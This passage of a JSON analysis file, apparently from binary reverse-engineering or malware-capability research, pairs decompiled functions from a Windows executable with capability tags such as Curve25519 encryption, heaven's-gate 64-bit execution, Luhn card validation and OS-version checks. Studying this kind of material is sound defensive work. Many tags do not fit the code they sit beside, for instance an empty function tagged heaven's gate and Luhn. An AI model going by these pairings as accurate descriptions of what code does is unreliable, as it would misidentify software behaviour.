        "decompiled_code": "\nuint64_t fcn.00412748(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint uStack44;\n    uint uStack40;\n    int32_t iStack36;\n    uchar *puStack32;\n    uchar auStack24 [4];\n    uchar auStack20 [16];\n    \n    puStack32 = &stack0xffffffec;\n    iStack36 = 0x412758;\n    sub.oleaut32.dll_VariantInit();\n    iStack36 = 3;\n    uStack40 = 0;\n    uStack44 = 0x400;\n    iVar1 = (***0x4a503c)(&stack0xffffffe8);\n    if (iVar1 == 0) {\n        uVar3 = iStack36;\n    }\n    else {\n        iVar1 = (***0x4a503c)(&stack0xffffffd4);\n        if (iVar1 == 0) {\n            uVar3 = fcn.00403440();\n        }\n        else if (iVar1 == -0x7ffdfffb) {\n            uVar2 = fcn.00412fa4();\n            uVar3 = uVar2 & 0x7f;\n        }\n        else {\n            fcn.0041107c();\n            uVar3 = 0;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 304
    },
    "004127f4": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004127f4(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack52 = 0x4128e2;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    fcn.00414f48();\n    fcn.004056f4();\n    cVar1 = fcn.00409e4c();\n    if (cVar1 == '\\0') {\n        iVar2 = (***0x4a511c)(var_4h, 0x400, 0, &fcn.004127f4::var_14h);\n        if (iVar2 == 0) {\n            _var_10h = var_14h;\n        }\n        else {\n            iVar2 = (***0x4a4ed4)(var_4h, 0x400, 0, &fcn.004127f4::var_20h);\n            if (iVar2 == 0) {\n                _var_10h = fcn.00403440();\n            }\n            else if (iVar2 == -0x7ffdfffb) {\n                uVar3 = fcn.00412fa4();\n                _var_10h = uVar3 & 0x7f;\n            }\n            else {\n                fcn.0041107c();\n                _var_10h = 0;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x4128e9;\n    uStack52 = 0x4128d9;\n    fcn.0040546c();\n    uStack52 = 0x4128e1;\n    fcn.00405c48();\n    return;\n}\n",
        "token_count": 490
    },
    "00416794": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416794(float arg_8h, float arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_EAX;\n    uint8_t *puVar2;\n    int32_t in_EDX;\n    double *pdVar3;\n    code *var_8h;\n    uint var_4h;\n    \n    var_8h = *(in_EDX + 8);\n    puVar2 = fcn.004162bc();\n    uVar1 = *puVar2;\n    if ((var_8h & 0xff000000) == 0xff000000) {\n        pdVar3 = (var_8h & 0xffffff) + in_EAX;\n    // switch table (5 cases) at 0x4167dd\n        switch(uVar1 & 0x7f) {\n        case 0:\n            *pdVar3 = CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h));\n            break;\n        case 1:\n            *pdVar3 = CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h));\n            break;\n        case 2:\n            *pdVar3 = arg_8h;\n            *(pdVar3 + 4) = arg_ch;\n            *(pdVar3 + 1) = arg_10h;\n            break;\n        case 3:\n            *pdVar3 = ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)));\n            break;\n        case 4:\n            *pdVar3 = ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)) * *0x416988);\n        }\n    }\n    else {\n        if ((var_8h & 0xff000000) == 0xfe000000) {\n            var_8h = *(*in_EAX + var_8h);\n        }\n        if (*(in_EDX + 0x10) == -0x80000000) {\n    // switch table (5 cases) at 0x416879\n            switch(uVar1 & 0x7f) {\n            case 0:\n                (*var_8h)();\n                break;\n            case 1:\n                (*var_8h)(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)));\n                break;\n            case 2:\n                (*var_8h)(arg_8h, arg_ch, arg_10h);\n                break;\n            case 3:\n                (*var_8h)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h))));\n                break;\n            case 4:\n                (*var_8h)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)) * *0x416988));\n            }\n        }\n        else {\n    // switch table (5 cases) at 0x41690c\n            switch(uVar1 & 0x7f) {\n            case 0:\n                (*var_8h)();\n                break;\n            case 1:\n                (*var_8h)(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)));\n                break;\n            case 2:\n                (*var_8h)(arg_8h, arg_ch, arg_10h);\n                break;\n            case 3:\n                (*var_8h)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h))));\n                break;\n            case 4:\n                (*var_8h)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)) * *0x416988));\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 808
    },
    "0041b8d8": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0041b8d8(uint arg_8h, uint arg_ch)\n\n{\n    ulong uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0040a118(arg_8h, arg_ch);\n    return uVar1;\n}\n",
        "token_count": 72
    },
    "0041d84c": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d84c(uint param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.0041e8c8(param_1);\n    // switch table (14 cases) at 0x41d882\n    switch(uVar1 & 0x7f) {\n    case 0:\n        fcn.004054c0();\n        break;\n    default:\n        fcn.0041c770();\n        break;\n    case 7:\n        fcn.0041cd60();\n        fcn.0040555c();\n        fcn.0040595c();\n        fcn.0041cd60();\n        break;\n    case 8:\n        fcn.004054c0();\n        break;\n    case 9:\n        fcn.004054c0();\n        break;\n    case 0xd:\n        fcn.004054c0();\n    }\n    return;\n}\n",
        "token_count": 205
    },
    "0041e9d8": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.0041e9d8(void)\n\n{\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack20 = 0x41eb7d;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uVar1 = fcn.0041e8c8();\n    // switch table (22 cases) at 0x41ea0f\n    switch(uVar1 & 0x7f) {\n    case 1:\n        fcn.0041e924(&stack0xfffffffc);\n        break;\n    case 2:\n        fcn.0041ede4();\n        break;\n    case 3:\n        fcn.0041ede4();\n        break;\n    case 4:\n        fcn.0041ede4();\n        break;\n    case 5:\n        fcn.0041ede4();\n        break;\n    case 6:\n    case 7:\n        fcn.0041e6ec();\n        break;\n    case 10:\n        fcn.0041e94c(&stack0xfffffffc);\n        break;\n    case 0xb:\n        fcn.0041e8dc();\n        break;\n    case 0xc:\n        fcn.0041e94c(&stack0xfffffffc);\n        break;\n    case 0xe:\n        fcn.0041e97c(&stack0xfffffffc);\n        break;\n    case 0xf:\n        fcn.0041ede4();\n        break;\n    case 0x10:\n        fcn.0041ede4();\n        break;\n    case 0x11:\n        fcn.0041ede4();\n        break;\n    case 0x12:\n        fcn.0041e94c(&stack0xfffffffc);\n        break;\n    case 0x13:\n        fcn.0041ede4();\n        break;\n    case 0x14:\n        fcn.0041e94c(&stack0xfffffffc);\n        break;\n    case 0x15:\n        fcn.0041ede4();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41eb84;\n    uStack20 = 0x41eb7c;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 558
    },
    "0041eff4": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.0041eff4(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    ulong uVar3;\n    uint in_stack_ffffffc8;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x41f206;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    fcn.00411420();\n    uVar2 = fcn.0041cd3c();\n    // switch table (22 cases) at 0x41f036\n    switch(uVar2 & 0x7f) {\n    case 0:\n    case 0xd:\n        cVar1 = fcn.0041e8c8();\n        if (cVar1 != '\\r') {\n            fcn.00416108();\n        }\n        break;\n    default:\n        fcn.0040dab4();\n        fcn.00404eb4();\n        break;\n    case 2:\n        fcn.0041d948();\n        fcn.0041568c();\n        break;\n    case 3:\n        fcn.0041d948();\n        fcn.0041568c();\n        break;\n    case 4:\n        fcn.0041d948();\n        fcn.0041568c();\n        break;\n    case 5:\n        fcn.0041d6f8();\n        fcn.00415884();\n        break;\n    case 6:\n    case 0xc:\n        fcn.0041e728();\n        fcn.004158c0();\n        break;\n    case 8:\n    case 9:\n        fcn.0041e8c8();\n        fcn.0041585c();\n        break;\n    case 10:\n        in_stack_ffffffc8 = 0x41f1a9;\n        fcn.0041ee2c(&stack0xfffffffc);\n        fcn.0041184c();\n        break;\n    case 0xf:\n        fcn.0041d774();\n        fcn.00415884();\n        break;\n    case 0x10:\n        fcn.0041d7b8();\n        fcn.004158ac();\n        break;\n    case 0x11:\n        fcn.0041d808();\n        fcn.00415898();\n        break;\n    case 0x12:\n    case 0x14:\n        fcn.0041e7e4();\n        fcn.004158ec();\n        break;\n    case 0x13:\n        uVar3 = fcn.0041d9b4();\n        in_stack_ffffffc8 = uVar3;\n        fcn.00415788(in_stack_ffffffc8, uVar3 >> 0x20);\n        break;\n    case 0x15:\n        fcn.0041d730();\n        fcn.00415884();\n    }\n    *in_FS_OFFSET = in_stack_ffffffc8;\n    uStack48 = 0x41f20d;\n    fcn.00411434();\n    fcn.00405c48();\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 745
    },
    "00452184": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.00452184(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    do {\n        iVar1 = *(in_EAX + 8 + (uVar2 & 0x7f) * 4);\n        if (iVar1 != 0) {\n            (***0x4a4e50)(iVar1);\n            *(in_EAX + 8 + (uVar2 & 0x7f) * 4) = 0;\n        }\n        uVar2 = uVar2 + 1;\n    } while (uVar2 != '\\x18');\n    return;\n}\n",
        "token_count": 155
    },
    "004522c0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004522c0(uchar *param_1, uint32_t param_2)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    \n    *param_1 = 3;\n    uVar1 = param_2 - 2;\n    if (uVar1 < 7) {\n        *(param_1 + 4) = 1;\n        iVar2 = 2;\n    }\n    else if (uVar1 == 7) {\n        *(param_1 + 4) = 2;\n        iVar2 = 9;\n    }\n    else {\n        *(param_1 + 4) = 0;\n        iVar2 = 0;\n    }\n    *(param_1 + 8) = ((param_2 & 0x7f) - iVar2) + 1;\n    return;\n}\n",
        "token_count": 188
    },
    "004522fc": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004522fc(uchar *param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = 10;\n    // switch table (18 cases) at 0x452327\n    switch(param_2 & 0xff) {\n    default:\n        *(param_1 + 4) = 0;\n        iVar1 = 0;\n        break;\n    case 2:\n        *(param_1 + 4) = 1;\n        iVar1 = 2;\n        break;\n    case 3:\n        *(param_1 + 4) = 2;\n        iVar1 = 3;\n        break;\n    case 4:\n    case 5:\n    case 6:\n    case 7:\n    case 8:\n    case 9:\n        *(param_1 + 4) = 3;\n        iVar1 = 4;\n        break;\n    case 10:\n    case 0xb:\n    case 0xc:\n    case 0xd:\n        *(param_1 + 4) = 4;\n        iVar1 = 10;\n        break;\n    case 0xe:\n    case 0xf:\n    case 0x10:\n    case 0x11:\n        *(param_1 + 4) = 5;\n        iVar1 = 0xe;\n    }\n    *(param_1 + 8) = ((param_2 & 0x7f) - iVar1) + 1;\n    return;\n}\n",
        "token_count": 331
    },
    "00452398": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452398(uchar *param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = 0x17;\n    // switch table (105 cases) at 0x45241e\n    switch(param_2 & 0xff) {\n    default:\n        *(param_1 + 4) = 0;\n        iVar1 = 0;\n        break;\n    case 2:\n    case 3:\n    case 4:\n        *(param_1 + 4) = 1;\n        iVar1 = 2;\n        break;\n    case 5:\n    case 6:\n    case 7:\n        *(param_1 + 4) = 2;\n        iVar1 = 5;\n        break;\n    case 8:\n    case 9:\n    case 10:\n        *(param_1 + 4) = 3;\n        iVar1 = 8;\n        break;\n    case 0xb:\n    case 0xc:\n    case 0xd:\n        *(param_1 + 4) = 4;\n        iVar1 = 0xb;\n        break;\n    case 0xe:\n    case 0xf:\n    case 0x10:\n        *(param_1 + 4) = 5;\n        iVar1 = 0xe;\n        break;\n    case 0x11:\n    case 0x12:\n    case 0x13:\n        *(param_1 + 4) = 6;\n        iVar1 = 0x11;\n        break;\n    case 0x14:\n    case 0x15:\n        *(param_1 + 4) = 7;\n        iVar1 = 0x14;\n        break;\n    case 0x16:\n    case 0x17:\n        *(param_1 + 4) = 8;\n        iVar1 = 0x16;\n        break;\n    case 0x18:\n    case 0x19:\n        *(param_1 + 4) = 9;\n        iVar1 = 0x18;\n        break;\n    case 0x1a:\n    case 0x1b:\n        *(param_1 + 4) = 10;\n        iVar1 = 0x1a;\n        break;\n    case 0x1c:\n    case 0x1d:\n        *(param_1 + 4) = 0xb;\n        iVar1 = 0x1c;\n        break;\n    case 0x1e:\n    case 0x1f:\n        *(param_1 + 4) = 0xc;\n        iVar1 = 0x1e;\n        break;\n    case 0x20:\n    case 0x21:\n    case 0x22:\n    case 0x23:\n        *(param_1 + 4) = 0xd;\n        iVar1 = 0x20;\n        break;\n    case 0x24:\n    case 0x25:\n    case 0x26:\n    case 0x27:\n        *(param_1 + 4) = 0xe;\n        iVar1 = 0x24;\n        break;\n    case 0x28:\n    case 0x29:\n    case 0x2a:\n    case 0x2b:\n        *(param_1 + 4) = 0xf;\n        iVar1 = 0x28;\n        break;\n    case 0x2c:\n    case 0x2d:\n    case 0x2e:\n    case 0x2f:\n        *(param_1 + 4) = 0x10;\n        iVar1 = 0x2c;\n        break;\n    case 0x30:\n    case 0x31:\n    case 0x32:\n    case 0x33:\n        *(param_1 + 4) = 0x11;\n        iVar1 = 0x30;\n        break;\n    case 0x34:\n    case 0x35:\n    case 0x36:\n    case 0x37:\n        *(param_1 + 4) = 0x12;\n        iVar1 = 0x34;\n        break;\n    case 0x38:\n    case 0x39:\n    case 0x3a:\n    case 0x3b:\n        *(param_1 + 4) = 0x13;\n        iVar1 = 0x38;\n        break;\n    case 0x3c:\n    case 0x3d:\n    case 0x3e:\n    case 0x3f:\n        *(param_1 + 4) = 0x14;\n        iVar1 = 0x3c;\n        break;\n    case 0x40:\n    case 0x41:\n    case 0x42:\n    case 0x43:\n        *(param_1 + 4) = 0x15;\n        iVar1 = 0x40;\n        break;\n    case 0x44:\n    case 0x45:\n    case 0x46:\n    case 0x47:\n        *(param_1 + 4) = 0x16;\n        iVar1 = 0x44;\n        break;\n    case 0x48:\n    case 0x49:\n    case 0x4a:\n    case 0x4b:\n        *(param_1 + 4) = 0x17;\n        iVar1 = 0x48;\n        break;\n    case 0x4c:\n    case 0x4d:\n    case 0x4e:\n    case 0x4f:\n        *(param_1 + 4) = 0x18;\n        iVar1 = 0x4c;\n        break;\n    case 0x50:\n    case 0x51:\n    case 0x52:\n    case 0x53:\n        *(param_1 + 4) = 0x19;\n        iVar1 = 0x50;\n        break;\n    case 0x54:\n    case 0x55:\n    case 0x56:\n    case 0x57:\n        *(param_1 + 4) = 0x1a;\n        iVar1 = 0x54;\n        break;\n    case 0x58:\n    case 0x59:\n    case 0x5a:\n    case 0x5b:\n        *(param_1 + 4) = 0x1b;\n        iVar1 = 0x58;\n        break;\n    case 0x5c:\n    case 0x5d:\n    case 0x5e:\n    case 0x5f:\n        *(param_1 + 4) = 0x1c;\n        iVar1 = 0x5c;\n        break;\n    case 0x60:\n        *(param_1 + 4) = 0x1d;\n        iVar1 = 0x60;\n        break;\n    case 0x61:\n        *(param_1 + 4) = 0x1e;\n        iVar1 = 0x61;\n        break;\n    case 0x62:\n        *(param_1 + 4) = 0x1f;\n        iVar1 = 0x62;\n        break;\n    case 99:\n        *(param_1 + 4) = 0x20;\n        iVar1 = 99;\n        break;\n    case 100:\n        *(param_1 + 4) = 0x21;\n        iVar1 = 100;\n        break;\n    case 0x65:\n        *(param_1 + 4) = 0x22;\n        iVar1 = 0x65;\n        break;\n    case 0x66:\n        *(param_1 + 4) = 0x23;\n        iVar1 = 0x66;\n        break;\n    case 0x67:\n        *(param_1 + 4) = 0x24;\n        iVar1 = 0x67;\n        break;\n    case 0x68:\n        *(param_1 + 4) = 0x25;\n        iVar1 = 0x68;\n    }\n    *(param_1 + 8) = ((param_2 & 0x7f) - iVar1) + 1;\n    return;\n}\n",
        "token_count": 1828
    },
    "0045f968": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045f968(uint param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    \n    puVar1 = *(param_2 + 8);\n    uVar2 = fcn.0040483c(puVar1[2], puVar1[1], *puVar1);\n    *(param_2 + 0xc) = uVar2 & 0x7f;\n    return;\n}\n",
        "token_count": 108
    },
    "00404a9c": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404a9c(void)\n\n{\n    return;\n}\n",
        "token_count": 17
    },
    "00404f60": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid fcn.00404f60(uint param_1, int32_t param_2)\n\n{\n    uint *in_FS_OFFSET;\n    \n    *in_FS_OFFSET = param_1;\n    (*(param_2 + 5))();\n    return;\n}\n",
        "token_count": 54
    },
    "0041c28c": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c28c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x41c303;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    fcn.00406f3c();\n    if (param_2 != 0) {\n        iVar2 = fcn.004162bc();\n        fcn.00406f3c(iVar2 + 5);\n        cVar1 = fcn.0040f874();\n        if (cVar1 == '\\0') {\n            fcn.00406f3c();\n        }\n    }\n    fcn.00416a54();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x41c30a;\n    uStack24 = 0x41c302;\n    fcn.00406f3c();\n    return;\n}\n",
        "token_count": 262
    },
    "00420728": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00420728(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    return param_2 - (in_EAX + 5);\n}\n",
        "token_count": 49
    },
    "0046a1dc": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046a1dc(int32_t *arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(*(in_EAX + 0x14) + 0x5b) - 1U < 2) {\n        fcn.0046a064(&stack0xfffffffc);\n        fcn.00452050();\n        cVar1 = fcn.00452158();\n        if (cVar1 == '\\0') {\n            fcn.0046a0f8(arg_8h[3] + -2, &stack0xfffffffc);\n            fcn.0046a0f8(arg_8h[3] + -2, &stack0xfffffffc);\n        }\n        else {\n            fcn.0046a180(arg_8h[3] + -2, *arg_8h + 10, &stack0xfffffffc);\n        }\n    }\n    else {\n        fcn.0046a064(&stack0xfffffffc);\n        fcn.00452050();\n        cVar1 = fcn.00452158();\n        if (cVar1 == '\\0') {\n            fcn.0046a0f8(arg_8h[1] + 5, &stack0xfffffffc);\n            fcn.0046a0f8(arg_8h[1] + 8, &stack0xfffffffc);\n        }\n        else {\n            fcn.0046a180(arg_8h[1] + 10, (arg_8h[2] - *(in_EAX + 0x18)) + -2, &stack0xfffffffc);\n        }\n    }\n    return;\n}\n",
        "token_count": 385
    },
    "0047ee10": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0047ee10(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    return param_2 - (in_EAX + 5);\n}\n",
        "token_count": 50
    },
    "004033d0": {
        "rules": [
            "generate random numbers using the Delphi LCG/d1e3669b265a4cefae2dee380548f202"
        ],
        "decompiled_code": "\nuint fcn.004033d0(void)\n\n{\n    uint32_t in_EAX;\n    \n    *0x4a1008 = *0x4a1008 * 0x8088405 + 1;\n    return in_EAX * *0x4a1008 >> 0x20;\n}\n",
        "token_count": 68
    },
    "0040766c": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nulong fcn.0040766c(void)\n\n{\n    uint in_EAX;\n    \n    return CONCAT44(in_EAX, in_EAX);\n}\n",
        "token_count": 32
    },
    "00409680": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409680(ushort *arg_8h)\n\n{\n    uint32_t in_EAX;\n    ushort *in_ECX;\n    uint32_t in_EDX;\n    \n    *in_ECX = in_EAX / (in_EDX & 0xffff);\n    *arg_8h = in_EAX % (in_EDX & 0xffff);\n    return;\n}\n",
        "token_count": 86
    },
    "0048ff1c": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048ff1c(uint param_1, char param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uVar4;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    puStack56 = 0x48ff35;\n    fcn.004058ec();\n    uStack60 = 0x48fffa;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    uStack72 = 0x48ffcd;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    uVar4 = 0x104;\n    puStack56 = &stack0xfffffffc;\n    uVar1 = fcn.004058fc(0, 0x104, &fcn.0048ff1c::var_ch, &fcn.0048ff1c::var_10h, &fcn.0048ff1c::var_14h, 0, 0x104);\n    uVar3 = 0x48ff79;\n    iVar2 = sub.kernel32.dll_GetVolumeInformationA(uVar1);\n    if (iVar2 != 0) {\n        if (param_2 == '\\0') {\n            uVar3 = 0;\n            fcn.00409d58(var_ch);\n        }\n        else {\n            fcn.0040ae94(var_8h);\n            uVar3 = var_8h;\n        }\n    }\n    *in_FS_OFFSET = uVar3;\n    *in_FS_OFFSET = uVar4;\n    fcn.0040546c(0x490001);\n    return;\n}\n",
        "token_count": 482
    },
    "00403d20": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.00403d20(void)\n\n{\n    ushort uVar1;\n    int32_t in_EAX;\n    \n    while( true ) {\n        uVar1 = fcn.00403bbc();\n        if (uVar1 == '\\n') {\n            return;\n        }\n        if (uVar1 >> 8 == '\\x1a') break;\n        if (uVar1 == '\\r') {\n            uVar1 = fcn.00403bbc();\n            if ((uVar1 == '\\n') || (uVar1 >> 8 == '\\x1a')) {\n                return;\n            }\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + -1;\n        }\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "00405f38": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2",
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
